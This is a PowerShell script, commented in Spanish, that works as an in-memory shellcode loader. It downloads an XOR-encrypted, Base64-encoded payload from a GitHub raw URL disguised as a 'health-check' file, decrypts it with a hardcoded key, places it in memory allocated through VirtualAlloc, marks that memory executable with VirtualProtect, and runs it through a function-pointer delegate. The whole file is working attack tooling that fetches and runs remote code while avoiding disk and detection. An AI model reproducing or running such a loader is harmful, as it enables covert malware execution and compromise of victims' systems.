# ========================================================================
# PowerShell In-Memory Shellcode Loader
# ========================================================================

# URL del shellcode cifrado
$PAYLOAD_URL = "https://raw.githubusercontent.com/ggggwrmsfootmen/curly-fortnight/refs/heads/main/health-check.enc"
$XOR_KEY = "MyVerySecureXORKey2025!@#"

Write-Host "[*] Descargando payload cifrado..."
$encData = (New-Object Net.WebClient).DownloadString($PAYLOAD_URL)

Write-Host "[*] Decodificando Base64..."
$encBytes = [Convert]::FromBase64String($encData)

Write-Host "[*] Descifrando con XOR..."
$keyBytes = [Text.Encoding]::UTF8.GetBytes($XOR_KEY)
$keyLen = $keyBytes.Length
$shellcode = New-Object byte[] $encBytes.Length

for ($i = 0; $i -lt $encBytes.Length; $i++) {
    $shellcode[$i] = $encBytes[$i] -bxor $keyBytes[$i % $keyLen]
}

Write-Host "[+] Shellcode descifrado: $($shellcode.Length) bytes"

Write-Host "[*] Allocando memoria RW..."
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );
}
'@

# Alocar memoria RW (0x3000 = MEM_COMMIT | MEM_RESERVE, 0x04 = PAGE_READWRITE)
$addr = [WinAPI]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x04)

if ($addr -eq [IntPtr]::Zero) {
    Write-Host "[-] Error alocando memoria"
    exit 1
}

Write-Host "[+] Memoria alocada en: 0x$($addr.ToString('X'))"

Write-Host "[*] Copiando shellcode a memoria..."
[Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $shellcode.Length)

Write-Host "[*] Cambiando permisos a RX..."
$oldProtect = 0
[WinAPI]::VirtualProtect($addr, $shellcode.Length, 0x20, [ref]$oldProtect) | Out-Null

Write-Host "[*] Creando delegado y ejecutando..."
$runner = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [Action])

Write-Host "[+] Ejecutando shellcode..."
$runner.Invoke()

Write-Host "[+] Completado"
